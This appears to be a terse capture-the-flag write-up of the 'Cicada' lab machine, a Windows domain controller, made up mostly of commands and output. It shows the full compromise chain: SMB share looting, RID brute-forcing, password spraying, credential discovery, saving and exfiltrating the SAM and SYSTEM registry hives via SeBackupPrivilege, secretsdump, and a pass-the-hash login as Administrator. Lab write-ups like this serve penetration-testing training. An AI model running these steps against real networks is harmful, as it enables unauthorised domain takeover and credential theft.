# Cicada

## Nmap

```text
PORT     STATE    SERVICE       REASON          VERSION
53/tcp   open     domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-14 22:27:38Z)
135/tcp  open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
445/tcp  open     microsoft-ds? syn-ack ttl 127
593/tcp  open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
3268/tcp open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
3269/tcp open     ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
5985/tcp open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp filtered adws          no-response
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26538/tcp): CLEAN (Timeout)
|   Check 2 (port 51547/tcp): CLEAN (Timeout)
|   Check 3 (port 63329/udp): CLEAN (Timeout)
|   Check 4 (port 52520/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-10-14T22:28:25
|_  start_date: N/A
|_clock-skew: 7h01m03s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

## SMB

```bash
smbclient -L  \\\\$IP\\ 
```

```bash
smbclient \\\\$IP\\HR

mask""
recurse ON
prompt OFF
mget *

cat Notice from HR.txt
```

## Crackmapexec

```bash
crackmapexec smb $IP -u 'guest' -p '' --rid-brute
```

```bash
SMB         10.129.136.247  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.136.247  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.136.247  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.136.247  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.136.247  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.136.247  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.136.247  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.136.247  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.136.247  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

### Users

```text
john.smoulder 
sarah.dantelia 
michael.wrightson 
david.orelious 
emily.oscars 
```

```bash
crackmapexec smb $IP -u 'users.txt' -p 'C-----------'
```

### nxc

```bash
nxc ldap $IP -u 'michael.wrightson' -p 'C-------------' -M get-desc-users

# gives david.orelious password

smbclient -u 'david.orelious' \\\\$IP\\Dev

get Backup_script.ps1

#script gives emily.oscars password
```

## Evil-winrm

```bash
evil-winrm -u 'emily.oscars' -p '' -i $IP

whoami /priv
```

## SEbackupPrivilege

```pwsh
mkdir C:\Temp

reg save hklm\sam C:\temp\sam.hive

reg save hklm\system C:\temp\system.hive

download C:\temp\sam.hive

download C:\temp\system.hive
```

### impacket-secretsdump

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

## Privesc-admin

```bash
evil-winrm -u "Administrator" -H"<NT-HASH>" -i $IP
```

### references

[Windows-Local-priv-esc-cookbook](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)
